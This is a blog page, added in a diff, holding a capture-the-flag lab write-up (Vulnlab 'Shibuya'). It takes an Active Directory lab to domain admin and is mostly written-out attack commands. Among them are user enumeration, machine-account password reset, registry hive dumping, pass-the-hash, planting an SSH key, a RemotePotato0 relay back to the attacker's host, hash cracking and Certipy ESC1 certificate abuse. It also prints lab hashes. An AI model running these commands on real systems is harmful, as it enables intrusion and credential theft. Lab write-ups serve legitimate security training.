@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="VL-Shibuya: Active Directory Penetration Testing WalkthroughThis comprehensive Vulnlab - Hack The Box walkthrough details my step-by-step approach to compromising the Shibuya Active Directory environm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Shibuya">
+<meta property="og:url" content="http://example.com/2025/04/10/VL-Shibuya/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="VL-Shibuya: Active Directory Penetration Testing WalkthroughThis comprehensive Vulnlab - Hack The Box walkthrough details my step-by-step approach to compromising the Shibuya Active Directory environm">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Shibuya/no_null.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/valid_user.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/precreated_m.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/kerberos_auth.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/pass_change.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/smb_access.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/svc_account.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/more_shares.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/images_share.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/hives.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/simon.watson.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/ssh_access.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/crossseionattack.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/nigel.mills.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/cracked_hash.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/rdp_access.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/cert_enroll.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/certipy.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/esc1.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/adminkey.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/noadmin.png">
+<meta property="og:image" content="http://example.com/images/Shibuya/booom.png">
+<meta property="article:published_time" content="2025-04-10T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:33:57.767Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Shibuya/no_null.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Shibuya</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/11/VL-Sweep/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/08/VL-Sendai/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/10/VL-Shibuya/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/10/VL-Shibuya/&text=VL-Shibuya"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/10/VL-Shibuya/&is_video=false&description=VL-Shibuya"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Shibuya&body=Check out this article: http://example.com/2025/04/10/VL-Shibuya/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/10/VL-Shibuya/&title=VL-Shibuya"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/10/VL-Shibuya/&name=VL-Shibuya&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/10/VL-Shibuya/&t=VL-Shibuya"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">VL-Shibuya: Active Directory Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Pre-created-Machine-Account"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting Pre-created Machine Account</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access-and-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access and Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-Account-Discovery"><span class="toc-number">1.5.</span> <span class="toc-text">Service Account Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Registry-Hive-Extraction"><span class="toc-number">1.6.</span> <span class="toc-text">Registry Hive Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-User-Access"><span class="toc-number">1.7.</span> <span class="toc-text">Gaining User Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Reconnaissance"><span class="toc-number">1.8.</span> <span class="toc-text">Active Directory Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Session-Relay-Attack"><span class="toc-number">1.9.</span> <span class="toc-text">Cross-Session Relay Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-Certificate-Templates"><span class="toc-number">1.10.</span> <span class="toc-text">Privilege Escalation via Certificate Templates</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Shibuya
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-10T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough"><a href="#VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough" class="headerlink" title="VL-Shibuya: Active Directory Penetration Testing Walkthrough"></a>VL-Shibuya: Active Directory Penetration Testing Walkthrough</h1><p>This comprehensive Vulnlab - Hack The Box walkthrough details my step-by-step approach to compromising the Shibuya Active Directory environment. Starting with initial enumeration and discovery of a pre-created machine account, I leveraged various offensive security techniques including Kerberos authentication, password spraying, and registry hive extraction to gain a foothold. The attack path progressed through cross-session relay attacks and ultimately achieved domain admin privileges via vulnerable certificate templates (ESC1). This penetration testing guide demonstrates practical exploitation of common Active Directory security misconfigurations found in enterprise environments, providing valuable insights for both offensive security professionals and defenders.</p>
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>First, I checked for null sessions, but access was denied:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;hello&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/no_null.png" alt="SMB Null Session Attempt"></p>
+<h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>I used Kerbrute to identify valid users in the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum --dc 10.10.82.222 -d shibuya.vl /usr/share/wordlists/seclists/Usernames/Names/names.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/valid_user.png" alt="Valid User Discovery"></p>
+<h2 id="Exploiting-Pre-created-Machine-Account"><a href="#Exploiting-Pre-created-Machine-Account" class="headerlink" title="Exploiting Pre-created Machine Account"></a>Exploiting Pre-created Machine Account</h2><p>I discovered a machine account named <code>RED$</code> which was pre-created. According to Microsoft documentation, these accounts can have their passwords changed:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/precreated_m.png" alt="Pre-created Machine Account"><br>We can authenticate using Kerberos:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares --kerberos</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/kerberos_auth.png" alt="Kerberos Authentication"><br>I changed the password for easier access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;shibuya.vl/RED$&#x27;:red@shibuya.vl -newpass &#x27;HelloWorld123@&#x27; -dc-ip AWSJPDC0522.shibuya.vl -p rpc-samr</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/pass_change.png" alt="Password Change"></p>
+<h2 id="Share-Access-and-Enumeration"><a href="#Share-Access-and-Enumeration" class="headerlink" title="Share Access and Enumeration"></a>Share Access and Enumeration</h2><p>With our new credentials, I connected to the shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/users -U &#x27;RED$&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/smb_access.png" alt="SMB Access"><br>Found users:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">All Users</span><br><span class="line">Default</span><br><span class="line">Default User</span><br><span class="line">nigel.mills</span><br><span class="line">simon.watson</span><br></pre></td></tr></table></figure>
+
+<h2 id="Service-Account-Discovery"><a href="#Service-Account-Discovery" class="headerlink" title="Service Account Discovery"></a>Service Account Discovery</h2><p>I enumerated users and found an interesting service account with credentials in the description:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;HelloWorld123@&#x27; --users</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/svc_account.png" alt="Service Account"><br>Found credentials: <code>svc_autojoin : &lt;HELLNO&gt;</code><br>Using these credentials allowed access to more shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;svc_autojoin&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/more_shares.png" alt="More Shares"></p>
+<h2 id="Registry-Hive-Extraction"><a href="#Registry-Hive-Extraction" class="headerlink" title="Registry Hive Extraction"></a>Registry Hive Extraction</h2><p>I connected to an images share with potentially useful data:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/images_share.png" alt="Images Share"><br>I extracted a Windows Image (WIM) file containing registry hives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27; -c &#x27;timeout 120; iosize 16384; get \AWSJPWK0222-02.wim&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wimmountrw AWSJPWK0222-02.wim 1 /mnt/wim_mount</span><br></pre></td></tr></table></figure>
+<p>After mounting, I extracted the SAM, SYSTEM, and SECURITY hives and ran secretsdump:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/hives.png" alt="Registry Hives"><br>From the output, I found interesting hashes, including an operator hash and a cached domain logon:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56)</span><br></pre></td></tr></table></figure>
+<h2 id="Gaining-User-Access"><a href="#Gaining-User-Access" class="headerlink" title="Gaining User Access"></a>Gaining User Access</h2><p>The hash for Simon didn’t work directly, but password spraying with the operator hash worked:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/simon.watson.png" alt="Simon Watson Access"><br>While WinRM didn’t work, I remembered port 22 (SSH) was open. I uploaded an SSH key via SMB to gain shell access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f simon</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;mkdir simon.watson/.ssh; put /home/kali/.ssh/simon.w.pub simon.watson/.ssh/authorized_keys&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/simon Simon.Watson@10.10.94.60</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/ssh_access.png" alt="SSH Access"></p>
+<h2 id="Active-Directory-Reconnaissance"><a href="#Active-Directory-Reconnaissance" class="headerlink" title="Active Directory Reconnaissance"></a>Active Directory Reconnaissance</h2><p>I uploaded SharpHound to collect AD data:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpHound.exe -c All</span><br></pre></td></tr></table></figure>
+<p>Downloaded the results for analysis:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;get &quot;simon.watson/20250410065413_BloodHound.zip&quot; Shibuya_BloodHound.zip&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cross-Session-Relay-Attack"><a href="#Cross-Session-Relay-Attack" class="headerlink" title="Cross-Session Relay Attack"></a>Cross-Session Relay Attack</h2><p>BloodHound analysis revealed two users with active sessions: Simon.Watson (which we already owned) and Nigel.Mills. I decided to perform a cross-session relay attack to compromise Nigel.Mills’s account.<br><img src="/images/Shibuya/crossseionattack.png" alt="Cross Session Attack"><br>First, I uploaded RemotePotato0 (which evades antivirus detection):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash 5d8c3d1a20bd63f60f469f6763ca0d50 -c &#x27;put /home/panosoiko/Downloads/RemotePotato0.exe simon.watson/RemotePotato0.exe&#x27;</span><br></pre></td></tr></table></figure>
+<p>On the victim machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1 -x 10.8.5.195 -p 8080</span><br></pre></td></tr></table></figure>
+<p>On the attacker machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.78.105:8080</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/nigel.mills.png" alt="Nigel Mills Access"><br>I cracked the captured hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash322.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: <code>nigel.mills : Sail2.......</code></p>
+<h2 id="Privilege-Escalation-via-Certificate-Templates"><a href="#Privilege-Escalation-via-Certificate-Templates" class="headerlink" title="Privilege Escalation via Certificate Templates"></a>Privilege Escalation via Certificate Templates</h2><p>BloodHound revealed that Nigel could RDP to the machine and had certificate enrollment permissions:<br><img src="/images/Shibuya/rdp_access.png" alt="RDP Access"><br><img src="/images/Shibuya/cert_enroll.png" alt="Certificate Enrollment"><br>I set up an SSH tunnel to access LDAP services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1080 -N sshuser@10.8.5.195</span><br></pre></td></tr></table></figure>
+<p>Used Certipy to analyze the certificate templates:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy find -target 10.10.78.105 -dc-ip 10.10.78.105 -u &#x27;nigel.mills@shibuya.vl&#x27; -p &#x27;&#x27; -debug</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/certipy.png" alt="Certipy Results"><br>Found vulnerabilities in ESC1, ESC2, and ESC3. Decided to exploit ESC1 as it’s the easiest:<br><img src="/images/Shibuya/esc1.png" alt="ESC1 Vulnerability"><br>First attempt at exploiting the certificate template:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -dc-ip 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -ca shibuya-AWSJPDC0522-CA -u nigel.mills@shibuya.vl -p &#x27;&#x27; -upn administrator@shibuya.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/adminkey.png" alt="Admin Key"><br><img src="/images/Shibuya/noadmin.png" alt="No Admin Access"><br>This didn’t work. Looking closer at the template, I noticed that <code>_admin</code> was the owner:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object Control Permissions</span><br><span class="line">   Owner: SHIBUYA.VL\_admin</span><br></pre></td></tr></table></figure>
+<p>Due to certificate-based authentication changes (KB5014754), I needed to include the SID when requesting a certificate:<br><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -u nigel.mills@shibuya.vl -p PASS -ca shibuya-AWSJPDC0522-CA -target 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -upn &#x27;_admin@shibuya.vl&#x27; -key-size 4096 -sid &#x27;S-1-5-21-87560095-894484815-3652015022-500&#x27; -debug</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy auth -pfx _admin.pfx -dc-ip 10.10.78.105</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Shibuya/booom.png" alt="Domain Admin Access"><br>Finally, I used Evil-WinRM to access the domain controller as <code>_admin</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 10.10.78.105 -u &#x27;_admin&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure>
+<p>Success! Domain admin access achieved.</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0">https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">VL-Shibuya: Active Directory Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Pre-created-Machine-Account"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting Pre-created Machine Account</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access-and-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access and Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-Account-Discovery"><span class="toc-number">1.5.</span> <span class="toc-text">Service Account Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Registry-Hive-Extraction"><span class="toc-number">1.6.</span> <span class="toc-text">Registry Hive Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-User-Access"><span class="toc-number">1.7.</span> <span class="toc-text">Gaining User Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Reconnaissance"><span class="toc-number">1.8.</span> <span class="toc-text">Active Directory Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Session-Relay-Attack"><span class="toc-number">1.9.</span> <span class="toc-text">Cross-Session Relay Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-Certificate-Templates"><span class="toc-number">1.10.</span> <span class="toc-text">Privilege Escalation via Certificate Templates</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/10/VL-Shibuya/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/10/VL-Shibuya/&text=VL-Shibuya"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
